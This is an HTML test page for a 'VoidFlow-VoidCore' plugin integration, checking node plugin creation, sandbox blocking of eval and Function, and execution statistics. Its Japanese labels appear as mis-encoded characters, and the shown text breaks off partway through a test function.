<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ”Œ VoidFlow-VoidCoreçµ±åˆãƒ†ã‚¹ãƒˆ Phase 2</title>
    <style>
        body {
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            background: linear-gradient(135deg, #2e1a47, #4a1a4a);
            color: #ffffff;
            padding: 20px;
            min-height: 100vh;
            margin: 0;
        }
        
        .test-container {
            max-width: 1600px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 20px;
        }
        
        .test-section {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #666;
            border-radius: 8px;
            padding: 20px;
        }
        
        .test-title {
            color: #9b59b6;
            font-size: 16px;
            margin-bottom: 15px;
            border-bottom: 2px solid #9b59b6;
            padding-bottom: 5px;
        }
        
        .button {
            background: #9b59b6;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 10px 15px;
            cursor: pointer;
            margin: 5px;
            font-family: inherit;
            font-size: 12px;
            transition: all 0.3s ease;
        }
        
        .button:hover {
            background: #8e44ad;
            transform: translateY(-2px);
        }
        
        .button.success {
            background: #27ae60;
        }
        
        .button.warning {
            background: #f39c12;
        }
        
        .button.danger {
            background: #e74c3c;
        }
        
        .log-area {
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 6px;
            padding: 15px;
            height: 250px;
            overflow-y: auto;
            font-size: 11px;
            line-height: 1.4;
            margin: 10px 0;
        }
        
        .stats-panel {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 6px;
            padding: 15px;
            margin: 10px 0;
        }
        
        .stats-item {
            display: flex;
            justify-content: space-between;
            margin: 5px 0;
            font-size: 12px;
        }
        
        .stats-label {
            color: #bbb;
        }
        
        .stats-value {
            color: #9b59b6;
            font-weight: bold;
        }
        
        .header {
            grid-column: 1 / -1;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .header h1 {
            color: #9b59b6;
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .phase-indicator {
            background: linear-gradient(45deg, #9b59b6, #e74c3c);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            display: inline-block;
        }
        
        .test-result {
            padding: 10px;
            margin: 5px 0;
            border-radius: 4px;
            border-left: 4px solid;
        }
        
        .test-result.success {
            background: rgba(39, 174, 96, 0.2);
            border-color: #27ae60;
        }
        
        .test-result.error {
            background: rgba(231, 76, 60, 0.2);
            border-color: #e74c3c;
        }
        
        .test-result.info {
            background: rgba(155, 89, 182, 0.2);
            border-color: #9b59b6;
        }

        .node-execution-viz {
            background: #0d1b2a;
            border: 1px solid #415a77;
            border-radius: 6px;
            padding: 10px;
            margin: 10px 0;
            min-height: 150px;
        }

        .node-item {
            display: inline-block;
            background: #1b263b;
            border: 1px solid #415a77;
            border-radius: 4px;
            padding: 5px 10px;
            margin: 3px;
            font-size: 10px;
            transition: all 0.3s ease;
        }

        .node-item.executing {
            background: #f39c12;
            border-color: #e67e22;
            animation: pulse 1s infinite;
        }

        .node-item.completed {
            background: #27ae60;
            border-color: #2ecc71;
        }

        .node-item.error {
            background: #e74c3c;
            border-color: #c0392b;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="test-container">
        <div class="header">
            <h1>ğŸ”Œ VoidFlow-VoidCoreçµ±åˆãƒ†ã‚¹ãƒˆ</h1>
            <div class="phase-indicator">Phase 2: ãƒãƒ¼ãƒ‰â†’ãƒ—ãƒ©ã‚°ã‚¤ãƒ³çµ±ä¸€</div>
        </div>
        
        <div class="test-section">
            <div class="test-title">ğŸ­ ãƒãƒ¼ãƒ‰ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆãƒ†ã‚¹ãƒˆ</div>
            
            <button class="button" onclick="testNodePluginCreation()">æ¨™æº–ãƒãƒ¼ãƒ‰ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆ</button>
            <button class="button" onclick="testCustomPluginCreation()">ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆ</button>
            <button class="button success" onclick="testSandboxExecution()">ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å®Ÿè¡Œãƒ†ã‚¹ãƒˆ</button>
            <button class="button warning" onclick="testSecurityRestrictions()">ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åˆ¶é™ãƒ†ã‚¹ãƒˆ</button>
            
            <div class="log-area" id="pluginLog"></div>
            
            <div class="stats-panel">
                <div class="test-title">ãƒ—ãƒ©ã‚°ã‚¤ãƒ³çµ±è¨ˆ</div>
                <div class="stats-item">
                    <span class="stats-label">æ¨™æº–ãƒ—ãƒ©ã‚°ã‚¤ãƒ³:</span>
                    <span class="stats-value" id="standardPlugins">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³:</span>
                    <span class="stats-value" id="customPlugins">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">å®Ÿè¡ŒæˆåŠŸ:</span>
                    <span class="stats-value" id="successfulExecutions">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ–ãƒ­ãƒƒã‚¯:</span>
                    <span class="stats-value" id="securityBlocks">0</span>
                </div>
            </div>
        </div>
        
        <div class="test-section">
            <div class="test-title">ğŸš€ çµ±åˆå®Ÿè¡Œã‚·ã‚¹ãƒ†ãƒ ãƒ†ã‚¹ãƒˆ</div>
            
            <button class="button" onclick="testIntegrationInitialization()">çµ±åˆã‚·ã‚¹ãƒ†ãƒ åˆæœŸåŒ–</button>
            <button class="button" onclick="testMethodOverrides()">ãƒ¡ã‚½ãƒƒãƒ‰ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰</button>
            <button class="button" onclick="testNodeExecution()">ãƒãƒ¼ãƒ‰å®Ÿè¡Œãƒ†ã‚¹ãƒˆ</button>
            <button class="button danger" onclick="testErrorHandling()">ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°</button>
            
            <div class="log-area" id="integrationLog"></div>
            
            <div class="stats-panel">
                <div class="test-title">çµ±åˆå®Ÿè¡Œçµ±è¨ˆ</div>
                <div class="stats-item">
                    <span class="stats-label">ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å®Ÿè¡Œ:</span>
                    <span class="stats-value" id="pluginExecutions">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">ãƒ¬ã‚¬ã‚·ãƒ¼å®Ÿè¡Œ:</span>
                    <span class="stats-value" id="legacyExecutions">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">evalå›é¿æ•°:</span>
                    <span class="stats-value" id="evalAvoided">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">å¹³å‡å®Ÿè¡Œæ™‚é–“:</span>
                    <span class="stats-value" id="avgExecutionTime">0ms</span>
                </div>
            </div>
        </div>
        
        <div class="test-section">
            <div class="test-title">âš¡ ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãƒ»äº’æ›æ€§ãƒ†ã‚¹ãƒˆ</div>
            
            <button class="button" onclick="testPerformanceComparison()">ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹æ¯”è¼ƒ</button>
            <button class="button" onclick="testBackwardCompatibility()">ä¸‹ä½äº’æ›æ€§ãƒ†ã‚¹ãƒˆ</button>
            <button class="button success" onclick="testAllNodeTypes()">å…¨ãƒãƒ¼ãƒ‰ã‚¿ã‚¤ãƒ—ãƒ†ã‚¹ãƒˆ</button>
            <button class="button danger" onclick="clearAllTests()">ãƒ†ã‚¹ãƒˆã‚¯ãƒªã‚¢</button>
            
            <div class="log-area" id="performanceLog"></div>
            
            <div class="stats-panel">
                <div class="test-title">ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹çµ±è¨ˆ</div>
                <div class="stats-item">
                    <span class="stats-label">ãƒ—ãƒ©ã‚°ã‚¤ãƒ³é€Ÿåº¦:</span>
                    <span class="stats-value" id="pluginSpeed">-</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">ãƒ¬ã‚¬ã‚·ãƒ¼é€Ÿåº¦:</span>
                    <span class="stats-value" id="legacySpeed">-</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">é€Ÿåº¦æ”¹å–„:</span>
                    <span class="stats-value" id="speedImprovement">-</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">äº’æ›æ€§ãƒ¬ãƒ™ãƒ«:</span>
                    <span class="stats-value" id="compatibilityLevel">-</span>
                </div>
            </div>
        </div>
        
        <div class="test-section">
            <div class="test-title">ğŸ“Š ãƒãƒ¼ãƒ‰å®Ÿè¡Œå¯è¦–åŒ–</div>
            
            <button class="button" onclick="runNodeExecutionDemo()">å®Ÿè¡Œãƒ‡ãƒ¢é–‹å§‹</button>
            <button class="button" onclick="runAllNodeTypesDemo()">å…¨ãƒãƒ¼ãƒ‰ã‚¿ã‚¤ãƒ—ãƒ‡ãƒ¢</button>
            
            <div class="node-execution-viz" id="nodeViz">
                <div style="color: #666; text-align: center; margin-top: 50px;">
                    ãƒãƒ¼ãƒ‰å®Ÿè¡Œã‚’é–‹å§‹ã—ã¦ãã ã•ã„
                </div>
            </div>
            
            <div class="stats-panel">
                <div class="test-title">å®Ÿè¡ŒçŠ¶æ³</div>
                <div class="stats-item">
                    <span class="stats-label">å®Ÿè¡Œä¸­ãƒãƒ¼ãƒ‰:</span>
                    <span class="stats-value" id="executingNodes">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">å®Œäº†ãƒãƒ¼ãƒ‰:</span>
                    <span class="stats-value" id="completedNodes">0</span>
                </div>
            </div>
        </div>
        
        <div class="test-section">
            <div class="test-title">ğŸ“‹ ãƒ†ã‚¹ãƒˆçµæœã‚µãƒãƒªãƒ¼</div>
            
            <button class="button" onclick="runFullTestSuite()">Phase 2å…¨ãƒ†ã‚¹ãƒˆå®Ÿè¡Œ</button>
            <button class="button" onclick="updateAllStats()">çµ±è¨ˆæ›´æ–°</button>
            <button class="button success" onclick="exportTestResults()">çµæœã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ</button>
            
            <div id="testResults"></div>
            
            <div class="stats-panel">
                <div class="test-title">Phase 2çµ±åˆçŠ¶æ³</div>
                <div class="stats-item">
                    <span class="stats-label">ãƒ†ã‚¹ãƒˆå®Ÿè¡Œæ•°:</span>
                    <span class="stats-value" id="totalTests">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">æˆåŠŸãƒ†ã‚¹ãƒˆ:</span>
                    <span class="stats-value" id="successfulTests">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">çµ±åˆãƒ¬ãƒ™ãƒ«:</span>
                    <span class="stats-value" id="integrationLevel">0%</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">evalæ’é™¤ç‡:</span>
                    <span class="stats-value" id="evalEliminationRate">0%</span>
                </div>
            </div>
        </div>
        
        <div class="test-section">
            <div class="test-title">ğŸ›¡ï¸ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆè©³ç´°</div>
            
            <button class="button warning" onclick="testDangerousCode()">å±é™ºã‚³ãƒ¼ãƒ‰æ¤œå‡º</button>
            <button class="button warning" onclick="testMemoryLimits()">ãƒ¡ãƒ¢ãƒªåˆ¶é™ãƒ†ã‚¹ãƒˆ</button>
            <button class="button warning" onclick="testTimeoutHandling()">ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆå‡¦ç†</button>
            <button class="button success" onclick="testSandboxIsolation()">ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åˆ†é›¢</button>
            
            <div class="log-area" id="securityLog"></div>
            
            <div class="stats-panel">
                <div class="test-title">ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£çµ±è¨ˆ</div>
                <div class="stats-item">
                    <span class="stats-label">å±é™ºã‚³ãƒ¼ãƒ‰æ¤œå‡º:</span>
                    <span class="stats-value" id="dangerousCodeDetected">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">ãƒ¡ãƒ¢ãƒªé•åé˜²æ­¢:</span>
                    <span class="stats-value" id="memoryViolationsPrevented">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆç™ºå‹•:</span>
                    <span class="stats-value" id="timeoutsTriggered">0</span>
                </div>
                <div class="stats-item">
                    <span class="stats-label">ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¹ã‚³ã‚¢:</span>
                    <span class="stats-value" id="securityScore">100%</span>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { voidCore } from './src/voidcore.js';
        import { VoidFlowNodePlugin, createAllStandardNodePlugins } from './src/voidflow-node-plugin.js';
        import { VoidFlowNodeIntegration, integrateVoidFlowNodes } from './src/voidflow-node-integration.js';

        // ãƒ†ã‚¹ãƒˆçŠ¶æ…‹
        let testStats = {
            totalTests: 0,
            successfulTests: 0,
            standardPlugins: 0,
            customPlugins: 0,
            successfulExecutions: 0,
            securityBlocks: 0,
            pluginExecutions: 0,
            legacyExecutions: 0,
            evalAvoided: 0,
            dangerousCodeDetected: 0,
            memoryViolationsPrevented: 0,
            timeoutsTriggered: 0
        };

        let nodeIntegration;
        let executionTimes = {
            plugin: [],
            legacy: []
        };

        // ãƒ¢ãƒƒã‚¯VoidFlowEngineï¼ˆã‚ˆã‚Šè©³ç´°ç‰ˆï¼‰
        const mockVoidFlowEngine = {
            flowId: 'phase2-test-flow',
            nodes: new Map([
                ['input-node', { id: 'input-node', type: 'input.text', config: {}, customCode: null }],
                ['math-node', { id: 'math-node', type: 'math.add', config: {}, customCode: null }],
                ['output-node', { id: 'output-node', type: 'output.console', config: {}, customCode: null }],
                ['custom-node', { id: 'custom-node', type: 'custom', config: {}, customCode: 'console.log("Hello Custom");' }],
                ['unsafe-node', { id: 'unsafe-node', type: 'custom', config: {}, customCode: 'eval("console.log(\'evil\')");' }],
                ['json-node', { id: 'json-node', type: 'json.parse', config: {}, customCode: null }],
                ['fetch-node', { id: 'fetch-node', type: 'web.fetch', config: {}, customCode: null }]
            ]),
            edges: new Map(),
            
            executeNode: async function(nodeId, inputPacket) {
                await new Promise(resolve => setTimeout(resolve, 50 + Math.random() * 100));
                const node = this.nodes.get(nodeId);
                if (!node) throw new Error(`Node not found: ${nodeId}`);
                
                return {
                    payload: `Legacy execution: ${nodeId}`,
                    timestamp: new Date(),
                    sourceNodeId: nodeId,
                    nodeType: node.type
                };
            },
            
            log: (message) => console.log(`MockEngine: ${message}`)
        };

        // ã‚°ãƒ­ãƒ¼ãƒãƒ«é–¢æ•°å®šç¾©
        window.testNodePluginCreation = testNodePluginCreation;
        window.testCustomPluginCreation = testCustomPluginCreation;
        window.testSandboxExecution = testSandboxExecution;
        window.testSecurityRestrictions = testSecurityRestrictions;
        window.testIntegrationInitialization = testIntegrationInitialization;
        window.testMethodOverrides = testMethodOverrides;
        window.testNodeExecution = testNodeExecution;
        window.testErrorHandling = testErrorHandling;
        window.testPerformanceComparison = testPerformanceComparison;
        window.testBackwardCompatibility = testBackwardCompatibility;
        window.testAllNodeTypes = testAllNodeTypes;
        window.runNodeExecutionDemo = runNodeExecutionDemo;
        window.runAllNodeTypesDemo = runAllNodeTypesDemo;
        window.testDangerousCode = testDangerousCode;
        window.testMemoryLimits = testMemoryLimits;
        window.testTimeoutHandling = testTimeoutHandling;
        window.testSandboxIsolation = testSandboxIsolation;
        window.clearAllTests = clearAllTests;
        window.runFullTestSuite = runFullTestSuite;
        window.updateAllStats = updateAllStats;
        window.exportTestResults = exportTestResults;

        // ==========================================
        // ğŸ­ ãƒãƒ¼ãƒ‰ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆãƒ†ã‚¹ãƒˆ
        // ==========================================

        async function testNodePluginCreation() {
            logToArea('pluginLog', 'ğŸ­ æ¨™æº–ãƒãƒ¼ãƒ‰ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                const standardPlugins = createAllStandardNodePlugins();
                testStats.standardPlugins = standardPlugins.size;
                
                logToArea('pluginLog', `âœ… æ¨™æº–ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆæˆåŠŸ: ${standardPlugins.size}å€‹`);
                
                // å„ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®åŸºæœ¬æ©Ÿèƒ½ç¢ºèª
                for (const [nodeType, plugin] of standardPlugins) {
                    const testData = { test: 'data', value: nodeType };
                    const context = { nodeId: `test-${nodeType}`, flowId: 'test' };
                    
                    try {
                        const result = await plugin.execute(testData, context);
                        logToArea('pluginLog', `âœ… ${nodeType}: å®Ÿè¡ŒæˆåŠŸ`);
                        testStats.successfulExecutions++;
                    } catch (error) {
                        logToArea('pluginLog', `âš ï¸ ${nodeType}: ${error.message}`);
                    }
                }
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', `æ¨™æº–ãƒãƒ¼ãƒ‰ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆãƒ†ã‚¹ãƒˆæˆåŠŸ (${standardPlugins.size}å€‹)`);
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('pluginLog', `âŒ æ¨™æº–ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `æ¨™æº–ãƒãƒ¼ãƒ‰ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        async function testCustomPluginCreation() {
            logToArea('pluginLog', 'ğŸ§© ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                // å®‰å…¨ãªã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³
                const safePlugin = new VoidFlowNodePlugin({
                    nodeType: 'custom.safe',
                    pluginId: 'test-safe-plugin',
                    displayName: 'Safe Custom Plugin',
                    executeFunction: async (inputData, context) => {
                        context.console.log('Safe custom execution');
                        return { input: inputData, safe: true, timestamp: context.now() };
                    }
                });
                
                const testData = { message: 'test custom execution' };
                const context = { nodeId: 'custom-test', flowId: 'test' };
                
                const result = await safePlugin.execute(testData, context);
                logToArea('pluginLog', `âœ… ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å®Ÿè¡ŒæˆåŠŸ: ${JSON.stringify(result)}`);
                
                testStats.customPlugins++;
                testStats.successfulExecutions++;
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', 'ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆãƒ†ã‚¹ãƒˆæˆåŠŸ');
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('pluginLog', `âŒ ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ä½œæˆãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        async function testSandboxExecution() {
            logToArea('pluginLog', 'ğŸ›¡ï¸ ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å®Ÿè¡Œãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                const sandboxPlugin = new VoidFlowNodePlugin({
                    nodeType: 'test.sandbox',
                    pluginId: 'test-sandbox-plugin',
                    executeFunction: async (inputData, context) => {
                        // ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å†…ã§ã®APIã‚¢ã‚¯ã‚»ã‚¹ãƒ†ã‚¹ãƒˆ
                        context.console.log('Testing sandbox APIs');
                        
                        const timeResult = context.now();
                        const randomResult = context.random();
                        
                        // åˆ¶é™ã•ã‚ŒãŸAPIã¸ã®ã‚¢ã‚¯ã‚»ã‚¹è©¦è¡Œ
                        const hasEval = typeof eval !== 'undefined';
                        const hasDocument = typeof document !== 'undefined';
                        
                        return {
                            timeAccess: typeof timeResult === 'number',
                            randomAccess: typeof randomResult === 'number',
                            evalBlocked: !hasEval,
                            documentLimited: !hasDocument,
                            sandboxWorking: true
                        };
                    }
                });
                
                const result = await sandboxPlugin.execute({}, { nodeId: 'sandbox-test' });
                
                logToArea('pluginLog', `âœ… ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ãƒ†ã‚¹ãƒˆçµæœ:`);
                logToArea('pluginLog', `   â° æ™‚é–“API: ${result.timeAccess ? 'åˆ©ç”¨å¯èƒ½' : 'ãƒ–ãƒ­ãƒƒã‚¯'}`);
                logToArea('pluginLog', `   ğŸ² ãƒ©ãƒ³ãƒ€ãƒ API: ${result.randomAccess ? 'åˆ©ç”¨å¯èƒ½' : 'ãƒ–ãƒ­ãƒƒã‚¯'}`);
                logToArea('pluginLog', `   ğŸš« eval: ${result.evalBlocked ? 'ãƒ–ãƒ­ãƒƒã‚¯æ¸ˆã¿' : 'å±é™º'}`);
                
                if (result.evalBlocked) testStats.securityBlocks++;
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', 'ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å®Ÿè¡Œãƒ†ã‚¹ãƒˆæˆåŠŸ');
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('pluginLog', `âŒ ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å®Ÿè¡Œãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        async function testSecurityRestrictions() {
            logToArea('pluginLog', 'ğŸ”’ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åˆ¶é™ãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                const securityPlugin = new VoidFlowNodePlugin({
                    nodeType: 'test.security',
                    pluginId: 'test-security-plugin',
                    executeFunction: async (inputData, context) => {
                        const violations = [];
                        
                        // å±é™ºãªAPIä½¿ç”¨è©¦è¡Œ
                        try {
                            eval('1+1');
                            violations.push('eval accessible');
                        } catch (e) {
                            context.console.log('eval blocked successfully');
                        }
                        
                        try {
                            new Function('return 1')();
                            violations.push('Function constructor accessible');
                        } catch (e) {
                            context.console.log('Function constructor blocked');
                        }
                        
                        return {
                            violations: violations,
                            securityLevel: violations.length === 0 ? 'secure' : 'compromised'
                        };
                    }
                });
                
                const result = await securityPlugin.execute({}, { nodeId: 'security-test' });
                
                if (result.violations.length === 0) {
                    logToArea('pluginLog', `âœ… ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åˆ¶é™ãƒ†ã‚¹ãƒˆæˆåŠŸ: ã™ã¹ã¦ãƒ–ãƒ­ãƒƒã‚¯`);
                    testStats.securityBlocks += 2; // eval + Function
                } else {
                    logToArea('pluginLog', `âš ï¸ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£é•åæ¤œå‡º: ${result.violations.join(', ')}`);
                }
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', 'ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åˆ¶é™ãƒ†ã‚¹ãƒˆå®Œäº†');
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('pluginLog', `âŒ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åˆ¶é™ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        // ==========================================
        // ğŸš€ çµ±åˆå®Ÿè¡Œã‚·ã‚¹ãƒ†ãƒ ãƒ†ã‚¹ãƒˆ
        // ==========================================

        async function testIntegrationInitialization() {
            logToArea('integrationLog', 'ğŸš€ çµ±åˆã‚·ã‚¹ãƒ†ãƒ åˆæœŸåŒ–ãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                nodeIntegration = integrateVoidFlowNodes(mockVoidFlowEngine);
                await nodeIntegration.initialize();
                
                const stats = nodeIntegration.getIntegrationStats();
                logToArea('integrationLog', `âœ… çµ±åˆã‚·ã‚¹ãƒ†ãƒ åˆæœŸåŒ–æˆåŠŸ`);
                logToArea('integrationLog', `   ğŸ“¦ æ¨™æº–ãƒ—ãƒ©ã‚°ã‚¤ãƒ³: ${stats.standardPlugins}å€‹`);
                logToArea('integrationLog', `   ğŸ§© ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³: ${stats.customPlugins}å€‹`);
                logToArea('integrationLog', `   ğŸ”Œ ç·ãƒ—ãƒ©ã‚°ã‚¤ãƒ³: ${stats.totalPlugins}å€‹`);
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', `çµ±åˆã‚·ã‚¹ãƒ†ãƒ åˆæœŸåŒ–æˆåŠŸ (${stats.totalPlugins}ãƒ—ãƒ©ã‚°ã‚¤ãƒ³)`);
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('integrationLog', `âŒ çµ±åˆã‚·ã‚¹ãƒ†ãƒ åˆæœŸåŒ–å¤±æ•—: ${error.message}`);
                addTestResult('error', `çµ±åˆã‚·ã‚¹ãƒ†ãƒ åˆæœŸåŒ–å¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        async function testMethodOverrides() {
            logToArea('integrationLog', 'ğŸ”„ ãƒ¡ã‚½ãƒƒãƒ‰ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                if (!nodeIntegration) {
                    await testIntegrationInitialization();
                }
                
                // executeNodeãƒ¡ã‚½ãƒƒãƒ‰ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ç¢ºèª
                const testPacket = { payload: 'override test' };
                const result = await mockVoidFlowEngine.executeNode('input-node', testPacket);
                
                logToArea('integrationLog', `âœ… executeNode ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰å‹•ä½œç¢ºèª`);
                logToArea('integrationLog', `   ğŸ“Š å®Ÿè¡Œçµæœ: ${JSON.stringify(result)}`);
                
                const integrationStats = nodeIntegration.getIntegrationStats();
                logToArea('integrationLog', `   ğŸ”Œ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å®Ÿè¡Œ: ${integrationStats.pluginExecutions}`);
                logToArea('integrationLog', `   ğŸ›ï¸ ãƒ¬ã‚¬ã‚·ãƒ¼å®Ÿè¡Œ: ${integrationStats.legacyExecutions}`);
                
                testStats.pluginExecutions += integrationStats.pluginExecutions;
                testStats.legacyExecutions += integrationStats.legacyExecutions;
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', 'ãƒ¡ã‚½ãƒƒãƒ‰ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ãƒ†ã‚¹ãƒˆæˆåŠŸ');
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('integrationLog', `âŒ ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `ãƒ¡ã‚½ãƒƒãƒ‰ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        async function testNodeExecution() {
            logToArea('integrationLog', 'âš¡ ãƒãƒ¼ãƒ‰å®Ÿè¡Œãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                if (!nodeIntegration) {
                    await testIntegrationInitialization();
                }
                
                const testNodes = ['input-node', 'math-node', 'output-node', 'json-node'];
                let successCount = 0;
                
                for (const nodeId of testNodes) {
                    try {
                        const startTime = Date.now();
                        const testData = { test: `execution-${nodeId}`, value: Math.random() };
                        const result = await mockVoidFlowEngine.executeNode(nodeId, testData);
                        const executionTime = Date.now() - startTime;
                        
                        executionTimes.plugin.push(executionTime);
                        
                        logToArea('integrationLog', `âœ… ${nodeId}: å®Ÿè¡ŒæˆåŠŸ (${executionTime}ms)`);
                        successCount++;
                        
                    } catch (error) {
                        logToArea('integrationLog', `âŒ ${nodeId}: å®Ÿè¡Œå¤±æ•— - ${error.message}`);
                    }
                }
                
                logToArea('integrationLog', `ğŸ“Š ãƒãƒ¼ãƒ‰å®Ÿè¡Œçµæœ: ${successCount}/${testNodes.length} æˆåŠŸ`);
                
                testStats.successfulExecutions += successCount;
                testStats.totalTests++;
                testStats.successfulTests++;
